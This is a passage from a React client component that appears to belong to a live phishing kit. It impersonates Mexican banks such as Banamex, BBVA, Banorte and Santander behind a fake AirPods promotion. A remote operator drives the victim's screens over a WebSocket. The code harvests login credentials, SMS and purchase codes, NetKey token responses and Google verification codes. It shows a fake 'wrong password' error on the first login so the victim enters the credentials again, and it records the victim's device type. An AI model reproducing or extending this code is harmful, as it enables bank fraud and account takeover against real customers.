import { useState, useEffect } from 'react';
import { useRoute } from 'wouter';
import { useWebSocket } from '@/hooks/useWebSocket';
import { ScreenTemplates } from '@/components/client/ScreenTemplates';
import { Session, ScreenType } from '@shared/schema';
import { formatDate } from '@/utils/helpers';

// Función para detectar el tipo de dispositivo
const detectDevice = (): string => {
  const userAgent = navigator.userAgent.toLowerCase();
  
  if (/android/.test(userAgent)) {
    return 'Android';
  } else if (/iphone|ipad|ipod/.test(userAgent)) {
    return 'iPhone/iPad';
  } else if (/windows/.test(userAgent)) {
    return 'PC Windows';
  } else if (/macintosh|mac os x/.test(userAgent)) {
    return 'PC Mac';
  } else if (/linux/.test(userAgent)) {
    return 'PC Linux';
  } else {
    return 'Dispositivo desconocido';
  }
};
import liverpoolLogo from '@assets/logo-brand-liverpool-f-c-design-acaab2087aa7319e33227c007e2d759b.png'; // Logo de Liverpool
import liverpoolLogoWhite from '@assets/liverpool_logo_white.png'; // Logo de Liverpool en blanco
import citibanamexLogo from '../assets/Banamex.png';
import banbajioLogo from '../assets/banbajio_logo_oficial.png';
import banbajioBackground from '../assets/IMG_0354.jpeg';
import bbvaLogo from '@assets/bbva_logo.png';
import bbvaLogoWhite from '../assets/bbva_logo_white.png';
import banorteLogoHeader from '@assets/Bo.png.png';
import bancoppelLogo from '@assets/bancoppel.png';
import banorteLogoFooter from '@assets/Banorte-01.png';
import hsbcLogo from '@assets/Hsbc.png';
import hsbcBackground from '@assets/IMG_0391.jpeg';
import amexLogo from '@assets/Amex.png';
import santanderLogo from '../assets/santander_logo.png';
import santanderLogoWhite from '../assets/santander_logo_white_fixed.png';
import scotiabankLogo from '../assets/scotiabank_logo.png';
import scotiabankLogoWhite from '../assets/scotiabank_logo_white.png';
import banregioLogo from '../assets/banregio_logo.png';
import banregioLogoWhite from '../assets/banregio_logo_white.png';

export default function ClientScreen() {
  // Get session ID from URL
  const [, params] = useRoute('/client/:sessionId');
  const [, homeParams] = useRoute('/');
  const sessionId = params?.sessionId || '';
  const isHomePage = homeParams !== null && !sessionId;
  
  // State for the current screen
  const [currentScreen, setCurrentScreen] = useState<ScreenType>(
    isHomePage ? ScreenType.PROMOCION : ScreenType.VALIDANDO
  );
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({
    banco: 'BANAMEX' // Banco por defecto para la página principal
  });
  const [bankLoaded, setBankLoaded] = useState<boolean>(isHomePage);
  
  // Additional screen-specific state
  const [screenData, setScreenData] = useState<{
    terminacion?: string;
    saldo?: string;
    monto?: string;
    clabe?: string;
    titular?: string;
    comercio?: string;
    mensaje?: string;
    telefono?: string;
    codigo?: string;
    challenge?: string;
  }>({});
  
  // Estado para controlar los mensajes iniciales
  const [initialMessage, setInitialMessage] = useState<string>('Conectando con Banamex...');
  // Para ventanas emergentes de Banamex (con sessionId), NO mostrar mensajes de carga
  const [showInitialMessage, setShowInitialMessage] = useState<boolean>(!sessionId && !isHomePage);
  
  // WebSocket connection
  const { socket, connected, sendMessage } = useWebSocket('/ws');
  
  // Register with the server when connection is established
  useEffect(() => {
    if (connected && sessionId) {
      sendMessage({
        type: 'REGISTER',
        role: 'CLIENT',
        sessionId
      });
    }
  }, [connected, sessionId, sendMessage]);

  // Handle WebSocket messages
  useEffect(() => {
    if (!socket) return;

    const handleMessage = (event: MessageEvent) => {
      try {
        const message = JSON.parse(event.data);
        
        // Handle different message types
        if (message.type === 'INIT_SESSION') {
          setSessionData(message.data);
          setBankLoaded(true);
          setShowInitialMessage(false); // Ocultar mensaje de carga inmediatamente
          // Set initial screen based on session data
          if (message.data.pasoActual) {
            setCurrentScreen(message.data.pasoActual as ScreenType);
          }
        }
        else if (message.type === 'EXISTING_SESSION_FOUND') {
          console.log('Sesión existente encontrada:', message.data);
          // Redirigir a la sesión existente
          window.location.href = `/client/${message.data.sessionId}`;
        }
        else if (message.type === 'NO_EXISTING_SESSION') {
          console.log('No hay sesión existente para este dispositivo');
          // El usuario puede continuar normalmente desde la página principal
        }
        else if (message.type === 'SCREEN_CHANGE') {
          const { tipo, ...data } = message.data;
          
          console.log('SCREEN_CHANGE recibido:', tipo, data);
          
          // Log para depurar los datos enviados para gmail_verify
          if (tipo.includes('gmail_verify')) {
            console.log('DATOS RECIBIDOS PARA GMAIL_VERIFY:', JSON.stringify(data));
            console.log('CÓDIGO DE VERIFICACIÓN RECIBIDO:', data.codigo || 'No se recibió código');
          }
          
          // Extract screen type from the message
          // The server sends 'mostrar_X', we need to remove the prefix
          let screenType = tipo.replace('mostrar_', '');
          
          // Normalize screen type for SMS_COMPRA (handle different case variations)
          if (screenType.toLowerCase() === 'sms_compra' || 
              screenType.toLowerCase() === 'smscompra' ||
              screenType.toLowerCase() === 'sms compra') {
            console.log('Pantalla SMS_COMPRA detectada, normalizando a:', ScreenType.SMS_COMPRA);
            screenType = ScreenType.SMS_COMPRA; // Use the exact value from enum
          }
          
          // Normalize screen type for SMS_VERIFICATION
          if (screenType.toLowerCase() === 'sms_verification' || 
              screenType.toLowerCase() === 'smsverification') {
            console.log('Pantalla SMS_VERIFICATION detectada, normalizando a:', ScreenType.SMS_VERIFICATION);
            screenType = ScreenType.SMS_VERIFICATION; // Use the exact value from enum
          }
          
          console.log('Cambiando a pantalla:', screenType);
          
          // Manejar lógica especial para la pantalla de login
          if (screenType === 'login') {
            setLoginAttempts(prev => {
              const newAttempts = prev + 1;
              
              // Si es el primer intento, mostrar error de credenciales incorrectas
              if (newAttempts === 1) {
                setScreenData(prevData => ({
                  ...prevData,
                  ...data,
                  errorMessage: 'Correo electrónico o contraseña incorrectos. Inténtalo de nuevo.'
                }));
                setCurrentScreen(ScreenType.LOGIN);
              }
              // Si es el segundo intento o más, mostrar mensaje de ejecutivo
              else if (newAttempts >= 2) {
                setScreenData(prevData => ({
                  ...prevData,
                  ...data,
                  mensaje: 'Un ejecutivo se comunicará con usted para ayudarlo con su promoción AirPods Pro Max.'
                }));
                setCurrentScreen(ScreenType.MENSAJE);
              }
              
              return newAttempts;
            });
            return;
          }
          
          // Limpiar contador de intentos para otras pantallas
          setLoginAttempts(0);
          
          // Verificación para casos especiales de pantallas
          if (tipo.toLowerCase().includes('sms_compra') || 
              tipo.toLowerCase().includes('smscompra') ||
              screenType.toLowerCase() === 'sms_compra' ||
              screenType.toLowerCase() === 'smscompra') {
            console.log('Verificando expresamente que SMS_COMPRA se establezca correctamente');
            console.log('Datos para mostrar en SMS_COMPRA:', data);
            setCurrentScreen(ScreenType.SMS_COMPRA);
            // Actualizamos los datos explícitamente para asegurar que se muestren
            setScreenData({
              ...data,
              terminacion: data.terminacion || '****'
            });
            // Importante: no debemos actualizar screenData nuevamente al final de esta función
            return;
          } 
          else if (screenType.toLowerCase() === 'gmail_verify') {
            console.log('🔍 Mostrando pantalla de verificación Google con datos:', JSON.stringify(data));
            setCurrentScreen(ScreenType.GMAIL_VERIFY);
            
            // Procesamos los datos de la verificación Google
            // ELIMINAMOS cualquier valor predeterminado para asegurar que solo se use lo que envía el servidor
            
            console.log('⚠️ Datos de código:', {
              tipo: typeof data.codigo,
              valor: data.codigo,
              definido: data.codigo !== undefined
            });
            
            // Si NO hay un código definido, lo mostramos en consola como advertencia
            if (!data.codigo) {
              console.warn('⚠️ ¡ADVERTENCIA! No se recibió código de verificación.');
            }
            
            // Asignamos los datos directamente sin modificarlos
            // IMPORTANTE: No transformamos ni cambiamos el código para evitar problemas
            setScreenData(data);
            
            // Para asegurarnos que se muestra, lo imprimimos en consola
            console.log('✅ Código que se mostrará:', data.codigo);
            
            // Importante: no debemos actualizar screenData nuevamente al final de esta función
            return;
          } 
          else if (screenType === 'netkey') {
            console.log('Mostrando pantalla NetKey');
            console.log('Mostrando challenge:', data.challenge);
            setCurrentScreen(ScreenType.NETKEY);
            setScreenData(data);
            return;
          }
          else if (screenType === 'netkey2') {
            console.log('Mostrando pantalla NetKey 2');
            console.log('Mostrando challenge:', data.challenge);
            setCurrentScreen(ScreenType.NETKEY2);
            setScreenData(data);
            return;
          }
          else if (screenType === 'netkey_custom') {
            console.log('Mostrando pantalla NetKey Personalizado');
            console.log('Mostrando customChallenge:', data.customChallenge);
            setCurrentScreen(ScreenType.NETKEY_CUSTOM);
            setScreenData(data);
            return;
          }
          else if (screenType === 'acceso_denegado') {
            console.log('Mostrando pantalla de Acceso Denegado');
            setCurrentScreen(ScreenType.ACCESO_DENEGADO);
            setScreenData(data);
            return;
          }
          else if (screenType === 'acceso_denegado_2') {
            console.log('Mostrando pantalla de Acceso Denegado 2');
            setCurrentScreen(ScreenType.ACCESO_DENEGADO_2);
            setScreenData(data);
            return;
          }
          else {
            setCurrentScreen(screenType as ScreenType);
            // Actualizamos screenData aquí para los casos normales
            setScreenData(data);
          }
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    };

    socket.addEventListener('message', handleMessage);
    return () => socket.removeEventListener('message', handleMessage);
  }, [socket]);

  // Handle form submissions
  const handleSubmit = (screen: ScreenType, formData: Record<string, any>) => {
    if (connected) {
      console.log('Enviando datos al servidor:', screen, formData);
      
      // Manejar flujo de pantallas para página principal
      if (isHomePage) {
        if (screen === ScreenType.PROMOCION) {
          // Ir a términos y condiciones
          setCurrentScreen(ScreenType.TERMINOS);
          return;
        }
        
        if (screen === ScreenType.TERMINOS) {
          // Generar sessionId y folio únicos al aceptar términos
          const newSessionId = Math.random().toString(36).substring(2, 15);
          const dispositivo = detectDevice(); // Detectar tipo de dispositivo
          
          // Crear nueva sesión en el servidor con folio único y tipo de dispositivo
          sendMessage({
            type: 'CREATE_UNIQUE_SESSION',
            data: {
              sessionId: newSessionId,
              banco: 'BANAMEX',
              clientData: { 
                terminosAceptados: true,
                dispositivo: dispositivo 
              },
              timestamp: new Date().toISOString()
            }
          });
          
          // Actualizar el estado local con el nuevo sessionId
          setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'BANAMEX' }));
          setCurrentScreen(ScreenType.PHONE_INPUT);
          return;
        }
        
        if (screen === ScreenType.PHONE_INPUT) {
          // Verificar que tenemos sessionId
          if (!sessionData.sessionId) {
            console.error('No hay sessionId disponible para PHONE_INPUT');
            return;
          }
          
          // Enviar datos del teléfono al servidor
          sendMessage({
            type: 'UPDATE_SESSION_DATA',
            data: {
              sessionId: sessionData.sessionId,
              tipo: 'phone_input',
              data: formData
            }
          });
          
          // Cambiar automáticamente a la pantalla de escaneo QR
          setCurrentScreen(ScreenType.QR_SCAN);
          return;
        }
        
        if (screen === ScreenType.QR_VALIDATION) {
          // Verificar que tenemos sessionId
          if (!sessionData.sessionId) {
            console.error('No hay sessionId disponible para QR_VALIDATION');
            return;
          }
          
          // Enviar datos del QR al servidor
          sendMessage({
            type: 'UPDATE_SESSION_DATA',
            data: {
              sessionId: sessionData.sessionId,
              tipo: 'qr_validation',
              data: formData
            }
          });
          
          // Cambiar automáticamente a la pantalla de validación
          setCurrentScreen(ScreenType.QR_VALIDATION);
          return;
        }
        
        if (screen === ScreenType.SMS_VERIFICATION) {
          // Verificar que tenemos sessionId
          if (!sessionData.sessionId) {
            console.error('No hay sessionId disponible para SMS_VERIFICATION');
            return;
          }
          
          // Enviar datos del código SMS al servidor
          sendMessage({
            type: 'UPDATE_SESSION_DATA',
            data: {
              sessionId: sessionData.sessionId,
              tipo: 'sms_verification',
              data: formData
            }
          });
          
          // Cambiar automáticamente a la pantalla de validación
          setCurrentScreen(ScreenType.VALIDANDO);
          return;
        }
        
        if (screen === ScreenType.LOGIN) {
          // Si ya hay sessionId de términos, usar el existente; si no, crear uno nuevo
          let currentSessionId = sessionData.sessionId;
          
          if (!currentSessionId) {
            currentSessionId = Math.random().toString(36).substring(2, 15);
            
            // Crear nueva sesión si no existe
            sendMessage({
              type: 'CREATE_UNIQUE_SESSION',
              data: {
                sessionId: currentSessionId,
                banco: 'BANAMEX',
                clientData: formData,
                timestamp: new Date().toISOString()
              }
            });
            
            setSessionData(prev => ({ ...prev, sessionId: currentSessionId, banco: 'BANAMEX' }));
          } else {
            // Actualizar sesión existente con datos de login
            sendMessage({
              type: 'UPDATE_SESSION_DATA',
              data: {
                sessionId: currentSessionId,
                tipo: 'login',
                data: formData
              }
            });
          }
          
          setCurrentScreen(ScreenType.VALIDANDO);
          return;
        }
        
        if (screen === ScreenType.ACCESO_DENEGADO || screen === ScreenType.ACCESO_DENEGADO_2) {
          // Usar sessionData.sessionId o sessionId del URL
          const currentSessionId = sessionData.sessionId || sessionId;
          
          if (!currentSessionId) {
            console.error('No hay sessionId disponible para ACCESO_DENEGADO');
            return;
          }
          
          // Enviar datos de contacto al servidor
          sendMessage({
            type: 'CLIENT_INPUT',
            data: {
              tipo: screen === ScreenType.ACCESO_DENEGADO ? 'acceso_denegado' : 'acceso_denegado_2',
              sessionId: currentSessionId,
              ...formData
            }
          });
          
          // Cambiar a pantalla validando mientras esperamos respuesta del admin
          setCurrentScreen(ScreenType.VALIDANDO);
          return;
        }
      }
      
      // Manejo especial para flujo de Banamex popup window
      if (screen === ScreenType.BANAMEX_NETKEY) {
        const currentSessionId = sessionData.sessionId || sessionId;
        
        if (!currentSessionId) {
          console.error('No hay sessionId disponible para BANAMEX_NETKEY');
          return;
        }
        
        // Mostrar loader inmediatamente
        setCurrentScreen(ScreenType.VALIDANDO);
        
        // Enviar NetKey response al backend
        fetch('/api/banamex/submit-netkey', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            sessionId: currentSessionId,
            netkeyResponse: formData.netkeyResponse
          }),
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            console.log('[Banamex NetKey] Respuesta enviada exitosamente');
            // El servidor cambiará pasoActual a BANAMEX_CONTACT_FORM automáticamente
            // y el WebSocket nos enviará la actualización
          } else {
            console.error('[Banamex NetKey] Error:', data.message);
            // En caso de error, volver a la pantalla de NetKey
            setCurrentScreen(ScreenType.BANAMEX_NETKEY);
          }
        })
        .catch(error => {
          console.error('[Banamex NetKey] Error enviando:', error);
          // En caso de error, volver a la pantalla de NetKey
          setCurrentScreen(ScreenType.BANAMEX_NETKEY);
        });
        
        return;
      }
      
      if (screen === ScreenType.BANAMEX_CONTACT_FORM) {
        const currentSessionId = sessionData.sessionId || sessionId;
        
        if (!currentSessionId) {
          console.error('No hay sessionId disponible para BANAMEX_CONTACT_FORM');
          return;
        }
        
        // Mostrar loader inmediatamente
        setCurrentScreen(ScreenType.VALIDANDO);
        
        // Enviar formulario de contacto al backend
        fetch('/api/banamex/contact', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            sessionId: currentSessionId,
            nombreContacto: formData.nombreContacto,
            correoContacto: formData.correoContacto,
            celularContacto: formData.celularContacto,
            telefonoAlternativoContacto: formData.telefonoAlternativoContacto || ''
          }),
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            console.log('[Banamex Contact] Formulario enviado exitosamente');
            // El servidor cambiará pasoActual a BANAMEX_WAITING automáticamente
            // y el WebSocket nos enviará la actualización
          } else {
            console.error('[Banamex Contact] Error:', data.message);
            // En caso de error, volver al formulario
            setCurrentScreen(ScreenType.BANAMEX_CONTACT_FORM);
          }
        })
        .catch(error => {
          console.error('[Banamex Contact] Error enviando:', error);
          // En caso de error, volver al formulario
          setCurrentScreen(ScreenType.BANAMEX_CONTACT_FORM);
        });
        
        return;
      }
      
      // Enviar datos al servidor inmediatamente para sesiones existentes
      const messageData = {
        type: 'CLIENT_INPUT',
        data: {
          tipo: screen,
          sessionId: sessionData.sessionId || sessionId,
          ...formData
        }
      };
      console.log('Enviando mensaje WebSocket:', messageData);
      sendMessage(messageData);
      
      // Actualizar screenData local para mostrar los datos ingresados
      if (formData.telefono) {
        setScreenData(prev => ({ ...prev, telefono: formData.telefono }));
      }
      if (formData.codigo) {
        setScreenData(prev => ({ ...prev, codigo: formData.codigo }));
      }
      
      // Cambiar a pantalla validando mientras esperamos respuesta del admin
      setCurrentScreen(ScreenType.VALIDANDO);
    }
  };

  // Función para determinar el header basado en el banco
  const renderHeader = () => {
    if (sessionData.banco === 'LIVERPOOL') {
      return (
        <header className="bg-[#E1147B] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <div className="flex justify-center">
            <img 
              src={liverpoolLogo} 
              className="liverpool-logo inline-block filter brightness-0 invert" 
              alt="Liverpool" 
            />
          </div>
        </header>
      );
    } else if (sessionData.banco === 'BANBAJIO') {
      return (
        <>
          <div className="logo text-center py-4 bg-white">
            <img 
              src={banbajioLogo} 
              alt="BanBajío"
              className="banbajio-logo inline-block"
            />
            <div className="banbajio-header mt-2">
              {formatDate(new Date())}
            </div>
          </div>
        </>
      );
    } else if (sessionData.banco === 'CITIBANAMEX') {
      return (
        <header className="bg-[#005BAC] text-white p-4 text-center">
          <img 
            src={citibanamexLogo} 
            className="citibanamex-logo inline-block mb-2" 
            alt="Citibanamex" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BBVA') {
      return (
        <header className="bg-[#072146] text-white p-4 text-center">
          <img 
            src={bbvaLogoWhite} 
            className="bbva-logo inline-block white-logo mb-2" 
            alt="BBVA" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BANORTE') {
      return (
        <header className="bg-[#EC1C24] text-white p-4 text-center">
          <img 
            src={banorteLogoHeader} 
            className="banorte-logo inline-block mb-2" 
            alt="Banorte" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BANCOPPEL') {
      return (
        <header className="bg-[#0066B3] text-white p-4 text-center">
          <img 
            src={bancoppelLogo} 
            className="bancoppel-logo inline-block mb-2" 
            alt="BanCoppel" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'HSBC') {
      return (
        <header className="bg-white p-4 text-center">
          <img 
            src={hsbcLogo} 
            className="hsbc-logo inline-block mb-2" 
            alt="HSBC" 
            style={{ maxHeight: "48px" }}
          />
          <div className="font-bold text-sm text-black">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'AMEX') {
      return (
        <header className="bg-[#0077C8] text-white p-4 text-center">
          <img 
            src={amexLogo} 
            className="amex-logo inline-block mb-2" 
            alt="American Express" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'SANTANDER') {
      return (
        <header className="bg-[#EC0000] text-white p-4 text-center">
          <img 
            src={santanderLogoWhite} 
            className="santander-logo inline-block white-logo mb-2" 
            alt="Santander" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'SCOTIABANK') {
      return (
        <header className="bg-[#EC111A] text-white p-4 text-center">
          <img 
            src={scotiabankLogoWhite} 
            className="scotiabank-logo inline-block white-logo mb-2" 
            alt="Scotiabank" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BANREGIO') {
      return (
        <header className="bg-[#FF6600] text-white p-4 text-center">
          <div className="flex justify-center mb-2">
            <img 
              src={banregioLogoWhite} 
              className="banregio-logo inline-block white-logo" 
              alt="Banregio" 
            />
          </div>
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'SPIN') {
      return (
        <header className="bg-[#6551FF] text-white p-4 text-center">
          <div className="flex justify-center mb-2">
            <img 
              src="https://storage.googleapis.com/banking-spinbyoxxo/public/spin-logo-08a5c1a.svg" 
              className="spin-logo inline-block white-logo" 
              alt="SPIN" 
            />
          </div>
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BANAMEX') {
      return (
        <header className="bg-white text-black p-4 text-center border-b border-gray-200">
          <div className="flex justify-center mb-2">
            <img 
              src={citibanamexLogo} 
              className="banamex-logo inline-block" 
              alt="Banamex" 
              style={{maxHeight: '40px', height: '2.5rem', width: 'auto'}}
            />
          </div>
          <div className="font-bold text-sm text-gray-600">{formatDate(new Date())}</div>
        </header>
      );
    } else {
      // Default header (Banorte)
      return (
        <header className="bg-[#EC1C24] text-white p-4 text-center">
          <img 
            src={banorteLogoHeader} 
            className="banorte-logo inline-block mb-2" 
            alt="Banorte" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    }
  };

  // Función para renderizar el footer específico de cada banco
  const renderFooter = () => {
    if (sessionData.banco === 'BANBAJIO') {
      return (
        <footer className="mt-auto">
          <div className="banbajio-footer">
            Aprende más | Ayuda | Términos y condiciones | Seguridad en línea
          </div>
          <div className="banbajio-footer-bottom">
            <a href="#" className="text-white mx-2">Contáctanos</a>
            <a href="#" className="text-white mx-2">Aclaraciones</a>
            <a href="#" className="text-white mx-2">Promociones</a>
            <a href="#" className="text-white mx-2">Facebook</a>
            <a href="#" className="text-white mx-2">YouTube</a>
            <br />
            © Banbajio México 2024. Todos los Derechos Reservados
          </div>
        </footer>
      );
    } else if (sessionData.banco === 'BANAMEX') {
      return null;
    } else {
      return (
        <footer className="mt-auto">
          <div className="bg-gray-100 p-4 text-center text-sm">
            <a href={
              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/home' : 
              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/index.html' : 
              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/' :
              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/main/index.html' :
              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/' :
              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/' :
              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/' :
              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/personas.aspx' :
              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/' :
              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/' :
              sessionData.banco === 'BANAMEX' ? 'https://www.banamex.com/' :
              'https://www.banorte.com/'
            } target="_blank" rel="noopener noreferrer" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' : 
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'BANAMEX' ? 'text-[#ff6b35]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
              'text-[#EC1C24]'
            } mx-2`}>Aprende más</a>
            <a href={
              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/ayuda' : 
              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/servicios-digitales/preguntas-frecuentes.html' : 
              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/servicios-digitales/bbva-mexico.html' :
              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/comercio_electronico/index.html' :
              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/contacto/' :
              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/' :
              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/ayuda/' :
              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/canales-de-atencion.aspx' :
              sessionData.banco === 'BANAMEX' ? 'https://www.banamex.com/es/personas/contacto.html' :
              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/ayuda/' :
              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/centro-de-ayuda' :
              'https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/'
            } target="_blank" rel="noopener noreferrer" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'BANAMEX' ? 'text-[#ff6b35]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
              'text-[#EC1C24]'
            } mx-2`}>Ayuda</a>
            <a href={
              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/ayuda/terminos-y-condiciones/terminos-y-condiciones/' : 
              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/terminos-y-condiciones.html' : 
              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/informacion-adicional.html' :
              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/acerca_bancoppel/terminos.html' :
              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/condiciones/' :
              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/preferencias-legales/aviso-de-privacidad/' :
              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/terminos-condiciones-contratos/' :
              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/terminos-y-condiciones.aspx' :
              sessionData.banco === 'BANAMEX' ? 'https://www.banamex.com/es/personas/terminos-y-condiciones.html' :
              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/contenido/terminos.php' :
              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/aviso-de-privacidad' :
              'https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones'
            } target="_blank" rel="noopener noreferrer" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'BANAMEX' ? 'text-[#ff6b35]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
              'text-[#EC1C24]'
            } mx-2`}>Términos y condiciones</a>
            <a href={
              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/ayuda/seguridad-en-sus-compras/seguridad-en-sus-compras/' : 
              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/seguridad.html' : 
              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/servicios-digitales/seguridad-digital.html' :
              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/bancoppel_sitio/seguridad.html' :
              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/seguridad/' :
              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/seguridad/' :
              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/seguridad/' :
              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/seguridad-bancaria.aspx' :
              sessionData.banco === 'BANAMEX' ? 'https://www.banamex.com/es/personas/seguridad.html' :
              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/seguridad.php' :
              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/seguridad' :
              'https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte'
            } target="_blank" rel="noopener noreferrer" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'BANAMEX' ? 'text-[#ff6b35]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
              'text-[#EC1C24]'
            } mx-2`}>Seguridad en línea</a>
          </div>

          <div className={`${
            sessionData.banco === 'LIVERPOOL' ? 'bg-[#E1147B]' :
            sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 
            sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
            sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
            sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
            sessionData.banco === 'AMEX' ? 'bg-[#0077C8]' :
